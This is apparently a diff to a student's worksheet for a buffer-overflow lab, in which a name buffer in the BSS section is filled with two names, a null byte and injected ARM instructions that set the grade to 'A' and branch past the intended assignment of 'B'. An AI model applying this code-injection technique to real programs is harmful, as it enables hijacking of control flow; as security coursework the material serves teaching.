@@ -91,7 +91,7 @@ if (strcmp(name, "Andrew Appel") != 0) skip assignment to grade
    0x400854 <main+52>:	        cbnz	w0, 0x400864 <main+68>
 
 grade = 'B';
-   0x400858 <main+56>:	        mov	    w1, #0x42                  	// #66
+   0x400858 <main+56>:	        mov	    w1, #0x42                  	// #66 "B"
    0x40085c <main+60>:	        adrp	x0, 0x420000 <__libc_start_main@got.plt>
    0x400860 <main+64>:	        strb	w1, [x0, #68]
 
@@ -125,34 +125,34 @@ Address (in hex)    Content (in hex)    Description
 
 // BSS Section
 Address (in hex)    Description     Intended Content ("A" attack)
-0x420058            name[0]         
-0x420059            name[1]         
-0x42005a            name[2]         
-0x42005b            name[3]         
-0x42005c            name[4]         
-0x42005d            name[5]         
-0x42005e            name[6]         
-0x42005f            name[7]         
-0x420060            name[8]         
-0x420061            name[9]         
-0x420062            name[10]         
-0x420063            name[11]         
-0x420064            name[12]         
-0x420065            name[13]         
-0x420066            name[14]         
-0x420067            name[15]         
-0x420068            name[16]         
-0x420069            name[17]         
-0x42006a            name[18]         
-0x42006b            name[19]         
-0x42006c            name[20]         
-0x42006d            name[21]         
-0x42006e            name[22]         
-0x42006f            name[23]         
-0x420070            name[24]         
-0x420071            name[25]         
-0x420072            name[26]         
-0x420073            name[27]         
+0x420058            name[0]         'M'
+0x420059            name[1]         'a'
+0x42005a            name[2]         'x'
+0x42005b            name[3]         'w'
+0x42005c            name[4]         'e'
+0x42005d            name[5]         'l'
+0x42005e            name[6]         'l'
+0x42005f            name[7]         ' '
+0x420060            name[8]         'a'
+0x420061            name[9]         'n'
+0x420062            name[10]        'd' 
+0x420063            name[11]        ' '
+0x420064            name[12]        'M' 
+0x420065            name[13]        'e' 
+0x420066            name[14]        'l' 
+0x420067            name[15]        'o' 
+0x420068            name[16]        'd' 
+0x420069            name[17]        'y' 
+0x42006a            name[18]        '\0' 
+0x42006b            name[19]        
+0x42006c            name[20]        mov w1, #0x41 // #65 "A"
+0x42006d            name[21]        ||
+0x42006e            name[22]        ||
+0x42006f            name[23]        ||
+0x420070            name[24]        b 0x40085c // return to grade = 'B' past the intended mov instruction
+0x420071            name[25]        ||
+0x420072            name[26]        ||
+0x420073            name[27]        ||
 0x420074            name[28]         
 0x420075            name[29]         
 0x420076            name[30]         
